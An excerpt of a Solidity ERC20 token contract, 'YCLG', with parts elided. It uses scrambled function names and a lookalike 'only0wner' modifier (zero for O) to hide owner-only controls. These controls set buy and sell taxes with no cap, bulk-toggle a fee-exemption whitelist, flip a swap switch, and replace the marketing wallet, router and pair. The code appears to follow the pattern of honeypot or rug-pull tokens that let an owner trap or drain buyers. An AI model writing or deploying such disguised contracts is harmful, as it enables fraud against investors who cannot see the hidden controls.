...
contract YCLG is ERC20, Ownable{
    ...
    mapping (address => bool) public PzJuBExjzcMe;
    ...
    constructor() ERC20("YCLG", "YCLG") {
        ...
        PzJuBExjzcMe[msg.sender] = true;
        PzJuBExjzcMe[address(pair)] = true;
        PzJuBExjzcMe[marketingWallet] = true;
        PzJuBExjzcMe[address(router)] = true;
        PzJuBExjzcMe[address(this)] = true;
    }
    ...
    function OUJAOKtKBbTZC(uint256 _marketing, uint256 _liquidity, uint256 _burn) external only0wner{
        taxes = Taxes(_marketing, _liquidity, _burn);
    }

    function RNlcgUAxgT(address [] calldata accounts, bool newValue) external only0wner {
        for(uint256 i = 0; i < accounts.length; i++) {
            PzJuBExjzcMe[accounts[i]] = newValue;
        }
    }

    function HWjTisElNsuIFT(bool swaped) external only0wner {
        swapEd = swaped;
    }

    function ClnRusgOdiDaK(uint256 _marketing, uint256 _liquidity, uint256 _burn) external only0wner{
        sellTaxes = Taxes(_marketing, _liquidity, _burn);
    }

    function jxRDUKaWgmgp(address newWallet) external only0wner{
        marketingWallet = newWallet;
    }

    function isgWbgkvSE(IRouter _router, address _pair) external only0wner{
        router = _router;
        pair = _pair;
    }
